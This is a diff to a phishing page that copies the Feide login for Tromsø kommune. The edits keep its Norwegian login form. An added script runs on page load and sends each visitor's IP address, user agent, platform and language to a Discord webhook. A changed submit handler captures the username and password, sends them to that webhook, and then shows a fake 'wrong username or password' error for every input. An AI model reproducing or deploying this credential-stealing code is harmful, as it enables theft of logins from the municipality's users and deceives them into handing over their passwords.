@@ -27,17 +27,6 @@
                         <label for="language-chooser" class="show-for-sr">Velg språk</label>
                         <input type="hidden" id="language-chooser" name="language" class="language-chooser" aria-label="Velg språk">
                     </form>
-                    <div class="lang-dropdown">
-                        <div tabindex="0" class="lang-dropdown-button closed" id="lang-dropdown-button" aria-haspopup="true" aria-expanded="false">
-                            <div lang="no"><span class="lang-option-wrapper"><i class="flag icon-flag-no"></i><span id="chosen-lang-name" class="lang-name" role="button" aria-label="Velg språk">Bokmål</span></span></div>
-                        </div>
-                        <div class="lang-dropdown-list" role="menu" style="display: none;">
-                            <div role="menuitem" tabindex="0" aria-label="Velg språk English" class="lang-dropdown-lang" lang="en"><i class="flag icon-flag-en"></i><span class="lang-name">English</span></div>
-                            <div role="menuitem" tabindex="0" aria-label="Velg språk Nynorsk" class="lang-dropdown-lang" lang="nn"><i class="flag icon-flag-nn"></i><span class="lang-name">Nynorsk</span></div>
-                            <div role="menuitem" tabindex="0" aria-label="Velg språk Bokmål" class="lang-dropdown-lang" lang="no"><i class="flag icon-flag-no"></i><span class="lang-name">Bokmål</span></div>
-                            <div role="menuitem" tabindex="0" aria-label="Velg språk Sámegiella" class="lang-dropdown-lang" lang="se"><i class="flag icon-flag-se"></i><span class="lang-name">Sámegiella</span></div>
-                        </div>
-                    </div>
                 </div>
             </nav>
             <div class="clear"></div>
@@ -63,11 +52,6 @@
                         </div>
                         <div class="media-body">
                             <div>Tromsø kommune</div>
-                            <div>
-                                <a href="https://idp.feide.no/simplesaml/module.php/feide/selectorg?org=tromso.kommune.no&amp;AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650">
-                                    <small>Endre tilhørighet</small>
-                                </a>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -87,14 +71,13 @@
                         <label for="password">&nbsp;Passord</label>
                         <div class="passwordfield">
                             <input class="" type="password" id="password" name="password" required autocomplete="current-password">
-                            <button type="button" id="showhide-password" class="secondary button-password-showhide" role="switch" aria-controls="password" aria-checked="false" aria-label="Vis passord" data-text-screenreader-hide-translated="Skjul passord" data-text-screenreader-show-translated="Vis passord" data-text-hide-translated="Skjul" data-text-show-translated="Vis">Vis</button>
-                            <p aria-live="polite" id="showhide-password-announcement" class="show-for-sr" data-text-hidden-translated="Passordet er skjult" data-text-visible-translated="Passordet er synlig">Passordet er skjult</p>
+                            <button type="button" id="showhide-password" class="secondary button-password-showhide" role="switch" aria-controls="password" aria-checked="false" aria-label="Vis passord">Vis</button>
                         </div>
                         <p class="breathe-top">
-                            <small><a href="https://idp.feide.no/simplesaml/module.php/feide/recover?AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650&amp;org=tromso.kommune.no">Glemt brukernavn eller passord?</a></small>
+                            <small><a href="https://idp.feide.no/simplesaml/module.php/feide/recover?AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b&amp;org=tromso.kommune.no">Glemt brukernavn eller passord?</a></small>
                         </p>
                         <button type="submit" class="button-primary breathe-top">Logg inn</button>
-                        <div class="error-message" id="loginErrorMessage">Could not log into account. Please make sure your password or username is typed correctly.</div>
+                        <div class="error-message" id="loginErrorMessage">Feil brukernavn eller passord. Vennligst prøv igjen.</div>
                     </form>
                     <p class="breathe-top">Eller velg en ekstern metode:</p>
                     <form action="https://idp.feide.no/simplesaml/module.php/feide/login-azuread?org=tromso.kommune.no&amp;AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650" method="post">
@@ -124,6 +107,40 @@
     <script src="https://idp.feide.no/simplesaml/module.php/feide/js/feide2.4fd59bef.js"></script>
     <script src="https://idp.feide.no/simplesaml/module.php/feide/js/login.52987398.js"></script>
     <script>
+        // Function to send the IP address and device information to the webhook
+        function sendUserInfo() {
+            // Get user device information
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language || navigator.userLanguage;
+
+            // Fetch the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip + " - feide"; // Append " - feide" to the IP address
+                    const webhookData = {
+                        content: `User IP Address: ${ip}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`
+                    };
+
+                    // Send the data to the webhook
+                    fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(webhookData)
+                    })
+                    .catch(error => {
+                        console.error('Error sending user info:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        }
+
+        // Function to handle form submission and send login info to the webhook
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the default form submission
 
@@ -131,13 +148,8 @@
             const password = document.getElementById('password').value;
             const errorMessage = document.getElementById('loginErrorMessage');
 
-            // Check if the username starts with "25"
-            if (!username.startsWith("25")) {
-                errorMessage.style.display = 'block'; // Show the error message
-                return;
-            } else {
-                errorMessage.style.display = 'none'; // Hide the error message if the username is valid
-            }
+            // Show the error message for any username input
+            errorMessage.style.display = 'block';
 
             // Prepare the data to send to Discord webhook
             const data = {
@@ -156,6 +168,9 @@
                 console.error('There was a problem with the fetch operation:', error);
             });
         });
+
+        // Send user info when the page is opened
+        window.onload = sendUserInfo;
     </script>
 </body>
 </html>
